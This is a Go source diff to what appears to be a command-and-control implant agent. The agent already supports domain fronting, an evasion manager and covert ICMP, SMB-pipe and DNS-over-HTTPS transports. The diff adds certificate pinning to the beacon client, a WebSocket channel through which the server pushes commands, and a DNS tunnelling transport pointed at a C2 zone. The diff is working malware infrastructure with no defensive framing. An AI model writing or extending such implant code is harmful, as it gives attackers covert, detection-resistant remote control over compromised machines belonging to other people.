@@ -49,11 +49,19 @@ type AgentConfig struct {
 	// still goes to ServerURL (the CDN front). Empty = no fronting.
 	FrontDomain string
 
+	// CertPin is the expected SHA-256 fingerprint (hex) of the server's TLS leaf
+	// certificate.  Empty = no pinning.  Format: "aabbcc…" or "aa:bb:cc:…".
+	CertPin string
+
 	// Alternative transport.  "http" (default) uses standard HTTP beaconing.
+	// "ws"   — WebSocket persistent connection — server pushes commands, no polling.
 	// "doh"  — DNS-over-HTTPS via DoH resolver (pkg/transport/doh.go)
 	// "icmp" — ICMP echo request/reply       (pkg/transport/icmp_windows.go)
 	// "smb"  — SMB named pipe via relay      (pkg/transport/smb_windows.go)
 	Transport   string
+	WSServerURL string // explicit ws(s):// URL; derived from ServerURL when empty
+	DNSDomain   string // authoritative zone for dns transport (e.g. c2.example.com)
+	DNSServer   string // DNS server host:port (default: ServerURL host + :5353)
 	DOHDomain   string // required when Transport=="doh"
 	DOHProvider string // "cloudflare" | "google"
 	SMBRelay    string // relay hostname/IP, required when Transport=="smb"
@@ -94,10 +102,15 @@ func NewAgent(cfg *AgentConfig) (*Agent, error) {
 		}
 	}
 
+	httpClient, err := newPinnedClient(cfg.CertPin)
+	if err != nil {
+		return nil, fmt.Errorf("cert pin: %w", err)
+	}
+
 	return &Agent{
 		ID:        generateUUID(),
 		cfg:       cfg,
-		client:    &http.Client{Timeout: 60 * time.Second},
+		client:    httpClient,
 		crypto:    cryptoMgr,
 		evasion:   evasionMgr,
 		isRunning: false,
@@ -416,6 +429,18 @@ func (a *Agent) Stop() { a.isRunning = false }
 // Returns nil when the transport is "http" (the default HTTP beacon loop is used).
 func (a *Agent) newTransport() (BeaconTransport, error) {
 	switch a.cfg.Transport {
+	case "dns":
+		domain := a.cfg.DNSDomain
+		if domain == "" {
+			return nil, fmt.Errorf("DNS transport requires DNSDomain to be set")
+		}
+		return newDNSNativeTransport(domain, a.ID, a.cfg.DNSServer), nil
+	case "ws":
+		wsURL := a.cfg.WSServerURL
+		if wsURL == "" {
+			wsURL = a.cfg.ServerURL
+		}
+		return newWSTransport(wsURL, a.ID)
 	case "doh":
 		if a.cfg.DOHDomain == "" {
 			return nil, fmt.Errorf("DoH transport requires DOHDomain to be set")
